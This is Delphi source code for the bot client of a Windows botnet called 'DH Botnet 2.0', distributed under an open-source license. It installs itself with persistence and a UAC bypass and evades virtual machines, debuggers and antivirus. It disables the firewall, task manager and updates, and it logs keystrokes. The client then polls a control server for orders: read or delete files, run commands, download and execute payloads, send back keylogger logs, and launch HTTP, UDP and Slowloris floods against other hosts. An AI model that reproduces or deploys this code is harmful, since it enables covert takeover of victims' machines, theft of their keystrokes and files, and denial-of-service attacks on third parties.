{
  This software is Copyright (c) 2016 by Doddy Hackman.
  This is free software, licensed under:
  The Artistic License 2.0
  The Artistic License
  Preamble
  This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains some artistic control over the development of that Package while still keeping the Package available as open source and free software.
  You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement.
  Definitions
  "Copyright Holder" means the individual(s) or organization(s) named in the copyright notice for the entire Package.
  "Contributor" means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures.
  "You" and "your" means any person who would like to copy, distribute, or modify the Package.
  "Package" means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard Version, or a Modified Version.
  "Distribute" means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization.
  "Distributor Fee" means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees.
  "Standard Version" refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder.
  "Modified Version" means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder.
  "Original License" means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation in the future.
  "Source" form means the source code, documentation source, and configuration files for the Package.
  "Compiled" form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form.
  Permission for Use and Modification Without Distribution
  (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version.
  Permissions for Redistribution of the Standard Version
  (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package.
  (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard Version, and as such will be subject to the Original License.
  Distribution of Modified Versions of the Package as Source
  (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE of the following:
  (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include your modifications in the Standard Version.
  (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is different from the name of the Standard Version.
  (c) allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under
  (i) the Original License or
  (ii) a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that the licensee received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license fees are prohibited but Distributor Fees are allowed.
  Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source
  (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. Such instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware that the instructions are invalid, then you do not forfeit any of your rights under this license.
  (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version.
  Aggregating or Linking the Package
  (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation.
  (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package.
  Items That are Not Considered Part of a Modified Version
  (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license.
  General Provisions
  (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license.
  (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified Version complies with the requirements of this license.
  (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder.
  (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate on the date that such litigation is filed.
  (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
}

// DH Botnet 2.0
// (C) Doddy Hackman 2016

program stub;

// {$APPTYPE CONSOLE}
{$R *.res}

uses
  System.SysUtils, Windows, Classes, idHTTP, IdSSLOpenSSL, DH_Builder_Tools,
  DH_Auxiliar_Tools, DH_Installer, DH_Malware_Functions, DH_Malware_Disables,
  DH_TinyKeylogger, DH_DoS, DH_Informator;

type
  other_array_dh_tools = array of string;

var
  auxiliar_tools: T_DH_Auxiliar_Tools;

var
  logs: string;

var
  link_admin, timeout_admin: string;

var
  url_master, clave, ip, country, user, os, time, code, datos: string;

var
  ordenes_re, ordenes_cmd, ordenes_arg1, ordenes_arg2, ordenes_arg3: string;

var
  split_data: other_array_dh_tools;
  add_ip, add_port: string;
  key_generated: string;

var
  contenido: string;
  builder_tools: T_DH_Builder_Tools;
  installer: T_DH_Installer;
  malware: T_DH_Malware_Functions;
  disable: T_DH_Malware_Disables;
  keylogger: T_DH_TinyKeylogger;
  dos: T_DH_DoS;
  active: string;

var
  op_hide_files, op_use_startup, op_keylogger, op_use_special_path,
    op_use_this_path, op_use_uac_tricky, op_uac_tricky_continue_if_off,
    op_uac_tricky_exit_if_off, op_use_this_datetime, creation_time,
    modified_time, last_access, special_path, path, folder, op_anti_virtual_pc,
    op_anti_virtual_box, op_anti_debug, op_anti_wireshark, op_anti_ollydbg,
    op_anti_anubis, op_anti_kaspersky, op_anti_vmware, op_disable_uac,
    op_disable_firewall, op_disable_cmd, op_disable_run, op_disable_taskmgr,
    op_disable_regedit, op_disable_updates, op_disable_msconfig: string;

  // Functions Auxiliars

const
  user_agent =
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0';
  // Edit

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function savefile(archivo, texto: string): bool;
var
  open_file: TextFile;
begin
  try
    begin
      AssignFile(open_file, archivo);
      FileMode := fmOpenWrite;

      if FileExists(archivo) then
      begin
        Append(open_file);
      end
      else
      begin
        Rewrite(open_file);
      end;

      Write(open_file, texto);
      CloseFile(open_file);
      Result := True;
    end;
  except
    Result := False;
  end;
end;

function split(texto: String; delimitador: string): other_array_dh_tools;
var
  array_ready: other_array_dh_tools;
  check1: integer;
  check2: integer;
begin
  if not(texto = '') and not(delimitador = '') then
  begin
    check1 := 0;
    check2 := 0;
    SetLength(array_ready, 1);
    array_ready[0] := '';

    for check1 := 1 to Length(texto) do
    begin
      if texto[check1] = delimitador then
      begin
        check2 := check2 + 1;
        SetLength(array_ready, Length(array_ready) + 1);
      end
      else
      begin
        array_ready[check2] := array_ready[check2] + texto[check1];
      end;
    end;
    if (Length(array_ready) > 1) then
    begin
      Result := array_ready;
    end;
  end
  else
  begin
    Result := array_ready;
  end;
end;

function read_file(archivo: String): AnsiString;
var
  open_file: File;
  tipo: byte;
begin
  if (FileExists(archivo)) then
  begin
    tipo := FileMode;
    try
      FileMode := 0;
      AssignFile(open_file, archivo);
{$I-}
      Reset(open_file, 1);
{$I+}
      if IoResult = 0 then
        try
          SetLength(Result, FileSize(open_file));
          if Length(Result) > 0 then
          begin
{$I-}
            BlockRead(open_file, Result[1], Length(Result));
{$I+}
            if IoResult <> 0 then
              Result := '';
          end;
        finally
          CloseFile(open_file);
        end;
    except
      begin
        FileMode := tipo;
        Result := 'Error';
      end;
    end;
  end
  else
  begin
    Result := 'Error';
  end;
end;

function dh_generate(cantidad: integer): string;

const
  opciones: array [1 .. 3] of string = ('mayus', 'minus', 'numbers');

var
  aleatorio: integer;
  iz: integer;

var
  finalr: string;
begin

  finalr := '';

  for iz := 1 to cantidad do
  begin
    aleatorio := Random(4 - 1) + 1;

    if (opciones[aleatorio] = 'mayus') then
    begin
      finalr := finalr + Chr(ord('A') + Random(26));
    end;
    if (opciones[aleatorio] = 'minus') then
    begin
      finalr := finalr + Chr(ord('a') + Random(26));
    end;
    if (opciones[aleatorio] = 'numbers') then
    begin
      finalr := finalr + Chr(ord('0') + Random(10));
    end;
  end;

  Result := finalr;

end;

function toma(link: string): string;
var
  nave: TIdHTTP;
  code: string;
begin
  code := '';
  try
    begin
      nave := TIdHTTP.Create();
      nave.Request.UserAgent := user_agent;
      nave.IOHandler := TIdSSLIOHandlerSocketOpenSSL.Create(nave);
      nave.HandleRedirects := True;
      code := nave.Get(link);
      nave.Free();
    end;
  except
    begin
      //
    end;
  end;
  Result := code;
end;

function tomar(link: string; params: TStringList): string;
var
  nave: TIdHTTP;
  code: string;
begin
  code := '';
  try
    begin
      nave := TIdHTTP.Create();
      nave.Request.UserAgent := user_agent;
      nave.IOHandler := TIdSSLIOHandlerSocketOpenSSL.Create(nave);
      nave.HandleRedirects := True;
      code := nave.Post(link, params);
      nave.Free();
    end;
  except
    begin
      //
    end;
  end;
  Result := code;
end;

// End of Functions Auxiliars

// Functions

function getmydata(): string;
var
  my_key, my_ip, my_country, my_user, my_os: string;
  read_code: string;
  info: T_DH_Informator;
begin

  info := T_DH_Informator.Create();

  my_key := read_file('key');
  my_key := StringReplace(my_key, sLineBreak, '', [rfReplaceAll, rfIgnoreCase]);

  {
    read_code := info.get_ip_and_country();

    my_ip := regex(read_code, '[ip]', '[ip]');
    if (my_ip = '') then
    begin
    my_ip := info.get_my_ip();
    end;
    if (my_ip = '') then
    begin
    my_ip := '?';
    end;
    my_country := regex(read_code, '[country]', '[country]');
    if (my_country = '') then
    begin
    my_country := info.get_my_country();
    end;
    if (my_country = '') then
    begin
    my_country := '?';
    end;
  }

  my_ip := '178.45.1.4';
  my_country := 'Brasil';

  my_user := info.get_username();
  my_os := info.get_os();

  info.Free();

  Result := '[key]' + my_key + '[key]' + '[ip]' + my_ip + '[ip]' + '[country]' +
    my_country + '[country]' + '[user]' + my_user + '[user]' + '[os]' +
    my_os + '[os]';

end;

procedure saludo;
var
  params: TStringList;
begin
  params := TStringList.Create();
  params.Add('entradatrasera=hidad');
  params.Add('key=' + clave);
  params.Add('ip=' + ip);
  params.Add('country=' + country);
  params.Add('username=' + user);
  params.Add('os=' + os);
  params.Add('timeout=' + time);
  tomar(url_master, params);
  params.Free();
end;

procedure sigo_vivo;
var
  params: TStringList;
begin
  params := TStringList.Create();
  params.Add('sigovivo=alpedo');
  params.Add('clavenow=' + clave);
  tomar(url_master, params);
  params.Free();
end;

function ver_ordenes(): string;
var
  re_cmd, arg1, arg2, arg3: string;
  params: TStringList;
begin
  params := TStringList.Create();
  params.Add('ordenespabots=alpedo');
  params.Add('clave=' + clave);
  code := tomar(url_master, params);
  params.Free();
  re_cmd := regex(code, '[+] Orden : ', '<br />');
  arg1 := regex(code, '[+] Arg1 : ', '<br />');
  arg2 := regex(code, '[+] Arg2 : ', '<br />');
  arg3 := regex(code, '[+] Arg3 : ', '<br />');
  Result := '[comando]' + re_cmd + '[comando]' + '[arg1]' + arg1 + '[arg1]' +
    '[arg2]' + arg2 + '[arg2]' + '[arg3]' + arg3 + '[arg3]';
end;

procedure mandar_rta(contenido: string);
var
  params: TStringList;
begin
  params := TStringList.Create();
  params.Add('mandocarajo=alpedo');
  params.Add('miclave=' + clave);
  params.Add('mirta=' + contenido);
  tomar(url_master, params);
  params.Free();
end;

// End of Functions

begin
  try

    builder_tools := T_DH_Builder_Tools.Create();

    contenido := builder_tools.read_resource(666);

    if not(contenido = '') then
    begin

      active := regex(contenido, '[active]', '[active]');

      link_admin := regex(contenido, '[botnet_link]', '[botnet_link]');
      timeout_admin := regex(contenido, '[timeout_admin]', '[timeout_admin]');

      op_hide_files := regex(contenido, '[op_hide_files]', '[op_hide_files]');
      op_use_startup := regex(contenido, '[op_use_startup]',
        '[op_use_startup]');
      op_keylogger := regex(contenido, '[op_keylogger]', '[op_keylogger]');
      op_use_special_path := regex(contenido, '[op_use_special_path]',
        '[op_use_special_path]');
      op_use_this_path := regex(contenido, '[op_use_this_path]',
        '[op_use_this_path]');
      special_path := regex(contenido, '[special_path]', '[special_path]');
      path := regex(contenido, '[path]', '[path]');
      folder := regex(contenido, '[folder]', '[folder]');

      op_use_uac_tricky := regex(contenido, '[op_use_uac_tricky]',
        '[op_use_uac_tricky]');
      op_uac_tricky_continue_if_off :=
        regex(contenido, '[op_uac_tricky_continue_if_off]',
        '[op_uac_tricky_continue_if_off]');
      op_uac_tricky_exit_if_off :=
        regex(contenido, '[op_uac_tricky_exit_if_off]',
        '[op_uac_tricky_exit_if_off]');

      op_use_this_datetime := regex(contenido, '[op_use_this_datetime]',
        '[op_use_this_datetime]');
      creation_time := regex(contenido, '[creation_time]', '[creation_time]');
      modified_time := regex(contenido, '[modified_time]', '[modified_time]');
      last_access := regex(contenido, '[last_access]', '[last_access]');

      op_anti_virtual_pc := regex(contenido, '[op_anti_virtual_pc]',
        '[op_anti_virtual_pc]');
      op_anti_virtual_box := regex(contenido, '[op_anti_virtual_box]',
        '[op_anti_virtual_box]');
      op_anti_debug := regex(contenido, '[op_anti_debug]', '[op_anti_debug]');
      op_anti_wireshark := regex(contenido, '[op_anti_wireshark]',
        '[op_anti_wireshark]');
      op_anti_ollydbg := regex(contenido, '[op_anti_ollydbg]',
        '[op_anti_ollydbg]');
      op_anti_anubis := regex(contenido, '[op_anti_anubis]',
        '[op_anti_anubis]');
      op_anti_kaspersky := regex(contenido, '[op_anti_kaspersky]',
        '[op_anti_kaspersky]');
      op_anti_vmware := regex(contenido, '[op_anti_vmware]',
        '[op_anti_vmware]');

      op_disable_uac := regex(contenido, '[op_disable_uac]',
        '[op_disable_uac]');
      op_disable_firewall := regex(contenido, '[op_disable_firewall]',
        '[op_disable_firewall]');
      op_disable_cmd := regex(contenido, '[op_disable_cmd]',
        '[op_disable_cmd]');
      op_disable_run := regex(contenido, '[op_disable_run]',
        '[op_disable_run]');
      op_disable_taskmgr := regex(contenido, '[op_disable_taskmgr]',
        '[op_disable_taskmgr]');
      op_disable_regedit := regex(contenido, '[op_disable_regedit]',
        '[op_disable_regedit]');
      op_disable_updates := regex(contenido, '[op_disable_updates]',
        '[op_disable_updates]');
      op_disable_msconfig := regex(contenido, '[op_disable_msconfig]',
        '[op_disable_msconfig]');

      if (active = '1') then
      begin
        installer := T_DH_Installer.Create();

        installer.set_UAC_Tricky(op_use_uac_tricky,
          op_uac_tricky_continue_if_off, op_uac_tricky_exit_if_off, '1');
        installer.setAntis(op_anti_virtual_pc, op_anti_virtual_box,
          op_anti_debug, op_anti_wireshark, op_anti_ollydbg, op_anti_anubis,
          op_anti_kaspersky, op_anti_vmware);
        installer.setDisables(op_disable_uac, op_disable_firewall,
          op_disable_cmd, op_disable_run, op_disable_taskmgr,
          op_disable_regedit, op_disable_updates, op_disable_msconfig);
        installer.setMoveFile(op_use_special_path, op_use_this_path,
          special_path, path, folder, 'bdh.exe');
        installer.setHide(op_hide_files);
        installer.setStartup(op_use_startup, 'bdh');
        installer.setDateTime(op_use_this_datetime, creation_time,
          modified_time, last_access);

        logs := installer.Install();

        installer.Free();
        builder_tools.Free();

        // Main

        malware := T_DH_Malware_Functions.Create();
        disable := T_DH_Malware_Disables.Create();
        dos := T_DH_DoS.Create();

        if (op_keylogger = '1') then
        begin
          keylogger := T_DH_TinyKeylogger.Create();
          keylogger.directory := GetCurrentDir;
          keylogger.logs_name := 'logs.html';
          keylogger.LoadVars;
          keylogger.start_keylogger_keys;
          keylogger.start_keylogger_windows;
        end;

        url_master := link_admin + '/admin.php';
        time := timeout_admin;

        if not(FileExists('key')) then
        begin
          Randomize;
          key_generated := dh_generate(5);
          savefile('key', key_generated);
          auxiliar_tools.hide_file('key');
        end;

        datos := getmydata();

        clave := regex(datos, '[key]', '[key]');
        ip := regex(datos, '[ip]', '[ip]');
        country := regex(datos, '[country]', '[country]');
        user := regex(datos, '[user]', '[user]');
        os := regex(datos, '[os]', '[os]');

        saludo;

        while (True) do
        begin

          Sleep(StrToInt(time) * 1000);

          sigo_vivo;
          ordenes_re := ver_ordenes;

          ordenes_cmd := regex(ordenes_re, '[comando]', '[comando]');
          ordenes_arg1 := regex(ordenes_re, '[arg1]', '[arg1]');
          ordenes_arg2 := regex(ordenes_re, '[arg2]', '[arg2]');
          ordenes_arg3 := regex(ordenes_re, '[arg3]', '[arg3]');

          // savefile('logs.txt', 'ordenes_cmd : ' + ordenes_cmd + sLineBreak);

          if (ordenes_cmd = 'ListDirectory') then
          begin
            mandar_rta(malware.list_directory(ordenes_arg1));
          end;

          if (ordenes_cmd = 'ReadFile') then
          begin
            mandar_rta(malware.read_file(ordenes_arg1));
          end;

          if (ordenes_cmd = 'DeleteFile') then
          begin
            mandar_rta(malware.delete_filename(ordenes_arg1));
          end;

          if (ordenes_cmd = 'ListProcess') then
          begin
            mandar_rta(malware.list_process());
          end;

          if (ordenes_cmd = 'KillProcess') then
          begin
            mandar_rta(malware.kill_process(ordenes_arg1));
          end;

          if (ordenes_cmd = 'KillProcess') then
          begin
            mandar_rta(malware.kill_process(ordenes_arg1));
          end;

          if (ordenes_cmd = 'EnableRegedit') then
          begin
            if (disable.regedit_manager('on')) then
            begin
              mandar_rta('[+] Enable Regedit: OK');
            end
            else
            begin
              mandar_rta('[+] Enable Regedit : FAIL');
            end;
          end;

          if (ordenes_cmd = 'DisableRegedit') then
          begin
            if (disable.regedit_manager('off')) then
            begin
              mandar_rta('[+] Disable Regedit : OK');
            end
            else
            begin
              mandar_rta('[+] Disable Regedit : FAIL');
            end;
          end;

          if (ordenes_cmd = 'EnableFirewall') then
          begin
            if (disable.firewall_manager('seven', 'on')) then
            begin
              mandar_rta('[+] Enable Firewall : OK');
            end
            else
            begin
              mandar_rta('[+] Enable Firewall : FAIL');
            end;
          end;

          if (ordenes_cmd = 'DisableFirewall') then
          begin
            if (disable.firewall_manager('seven', 'off')) then
            begin
              mandar_rta('[+] Disable Firewall : OK');
            end
            else
            begin
              mandar_rta('[+] Disable Firewall : FAIL');
            end;
          end;

          if (ordenes_cmd = 'OpenCD') then
          begin
            mandar_rta(malware.cd_manager('open'));
          end;

          if (ordenes_cmd = 'CloseCD') then
          begin
            mandar_rta(malware.cd_manager('close'));
          end;

          if (ordenes_cmd = 'ShowIcons') then
          begin
            mandar_rta(malware.icons_manager('show'));
          end;

          if (ordenes_cmd = 'HideIcons') then
          begin
            mandar_rta(malware.icons_manager('hide'));
          end;

          if (ordenes_cmd = 'ShowTaskbar') then
          begin
            mandar_rta(malware.taskbar_manager('show'));
          end;

          if (ordenes_cmd = 'HideTaskbar') then
          begin
            mandar_rta(malware.taskbar_manager('hide'));
          end;

          if (ordenes_cmd = 'MessagesSingle') then
          begin
            mandar_rta(malware.message_box(ordenes_arg1, ordenes_arg2,
              'Information'));
          end;

          if (ordenes_cmd = 'MessagesBomber') then
          begin
            mandar_rta(malware.message_box_bomber(ordenes_arg1, ordenes_arg2,
              'Information', StrToInt(ordenes_arg3)));
          end;

          if (ordenes_cmd = 'SendKeys') then
          begin
            mandar_rta(malware.SendKeys(ordenes_arg1));
          end;

          if (ordenes_cmd = 'WriteWord') then
          begin
            mandar_rta(malware.write_word(ordenes_arg1));
          end;

          if (ordenes_cmd = 'CrazyMouse') then
          begin
            mandar_rta(malware.crazy_mouse(StrToInt(ordenes_arg1)));
          end;

          if (ordenes_cmd = 'CrazyHour') then
          begin
            mandar_rta(malware.crazy_hour(StrToInt(ordenes_arg1)));
          end;

          if (ordenes_cmd = 'Shutdown') then
          begin
            mandar_rta(malware.shutdown());
          end;

          if (ordenes_cmd = 'Reboot') then
          begin
            mandar_rta(malware.reboot());
          end;

          if (ordenes_cmd = 'CloseSession') then
          begin
            mandar_rta(malware.close_session());
          end;

          if (ordenes_cmd = 'OpenURL') then
          begin
            mandar_rta(malware.load_page(ordenes_arg1));
          end;

          if (ordenes_cmd = 'LoadPaint') then
          begin
            mandar_rta(malware.load_paint());
          end;

          if (ordenes_cmd = 'EnableChangeTaskbarText') then
          begin
            mandar_rta(malware.edit_taskbar_text('on', ordenes_arg1));
          end;

          if (ordenes_cmd = 'DisableChangeTaskbarText') then
          begin
            mandar_rta(malware.edit_taskbar_text('off', 'hi'));
          end;

          if (ordenes_cmd = 'TurnOffMonitor') then
          begin
            mandar_rta(malware.turn_off_monitor());
          end;

          if (ordenes_cmd = 'Speak') then
          begin
            mandar_rta(malware.speak(ordenes_arg1));
          end;

          if (ordenes_cmd = 'PlayBeeps') then
          begin
            mandar_rta(malware.play_beep(StrToInt(ordenes_arg1)));
          end;

          if (ordenes_cmd = 'ExecuteCommand') then
          begin
            mandar_rta(malware.execute_command(ordenes_arg1));
          end;

          if (ordenes_cmd = 'BlockAll') then
          begin
            mandar_rta(malware.block_all('on'));
          end;

          if (ordenes_cmd = 'Keylogger') then
          begin
            if (FileExists('logs.html')) then
            begin
              mandar_rta(malware.read_file('logs.html'));
            end
            else
            begin
              mandar_rta('[-] Keylogger Logs : OK');
            end;
          end;

          if (ordenes_cmd = 'Uninstaller') then
          begin
            if (auxiliar_tools.delete_startup('bdh')) then
            begin
              mandar_rta('[+] Uninstaller : OK');
              ExitProcess(0);
            end
            else
            begin
              mandar_rta('[-] Uninstaller : FAIL');
            end;
          end;

          if (ordenes_cmd = 'ListDrives') then
          begin
            mandar_rta(malware.get_drives());
          end;

          if (ordenes_cmd = 'ListServices') then
          begin
            mandar_rta(malware.get_services());
          end;

          if (ordenes_cmd = 'ListWindows') then
          begin
            mandar_rta(malware.list_windows());
          end;

          if (ordenes_cmd = 'DownloadAndExecute') then
          begin
            mandar_rta(malware.download_and_execute(ordenes_arg1,
              ordenes_arg2));
          end;

          if (ordenes_cmd = 'ChangeScreensaver') then
          begin
            mandar_rta(malware.download_and_change_screensaver(ordenes_arg1));
          end;

          if (ordenes_cmd = 'ChangeWallpaper') then
          begin
            mandar_rta(malware.download_and_change_wallpaper(ordenes_arg1));
          end;

          if (ordenes_cmd = 'PrinterBomber') then
          begin
            mandar_rta(malware.printer_bomber(ordenes_arg1,
              StrToInt(ordenes_arg2)));
          end;

          if (ordenes_cmd = 'FormBomber') then
          begin
            mandar_rta(malware.form_bomber(ordenes_arg1, ordenes_arg2, '', '',
              0, 0, StrToInt(ordenes_arg3)));
          end;

          if (ordenes_cmd = 'HTMLBomber') then
          begin
            mandar_rta(malware.html_bomber(ordenes_arg1, ordenes_arg2, '',
              StrToInt(ordenes_arg3)));
          end;

          if (ordenes_cmd = 'WindowsBomber') then
          begin
            mandar_rta(malware.windows_bomber(StrToInt(ordenes_arg1)));
          end;

          if (ordenes_cmd = 'SQLIDoS') then
          begin
            if (dos.SQLI_DOS(ordenes_arg1, StrToInt(ordenes_arg2))) then
            begin
              mandar_rta('[+] SQLI DoS : OK');
            end
            else
            begin
              mandar_rta('SQLI DoS : FAIL');
            end;
          end;

          if (ordenes_cmd = 'HTTPFlood') then
          begin
            if (dos.HTTP_Flood(ordenes_arg1, StrToInt(ordenes_arg2))) then
            begin
              mandar_rta('[+] HTTP Flood : OK');
            end
            else
            begin
              mandar_rta('[-] HTTP Flood : FAIL');
            end;
          end;

          if (ordenes_cmd = 'SocketFlood') then
          begin
            split_data := split(ordenes_arg1, ':');
            add_ip := split_data[0];
            add_port := split_data[1];
            if (dos.Socket_Flood(add_ip, StrToInt(add_port), ordenes_arg2,
              StrToInt(ordenes_arg3))) then
            begin
              mandar_rta('[+] Socket Flood : OK');
            end
            else
            begin
              mandar_rta('[-] Socket Flood : FAIL');
            end;
          end;

          if (ordenes_cmd = 'Slowloris') then
          begin
            if (dos.Slowloris(ordenes_arg1, StrToInt(ordenes_arg2))) then
            begin
              mandar_rta('[+] Slowloris : OK');
            end
            else
            begin
              mandar_rta('[-] Slowloris : FAIL');
            end;
          end;

          if (ordenes_cmd = 'UDPFlood') then
          begin
            if (dos.UDP_Dos(ordenes_arg1, StrToInt(ordenes_arg2),
              StrToInt(ordenes_arg3))) then
            begin
              mandar_rta('[+] UDP Flood : OK');
            end
            else
            begin
              mandar_rta('[-] UDP Flood : FAIL');
            end;
          end;

        end;

        malware.Free();
        disable.Free();
        dos.Free();

        // End of Main

      end;

    end
    else
    begin
      ExitProcess(0);
    end;

  except
    begin
      //
    end;
  end;

end.

// The End ?
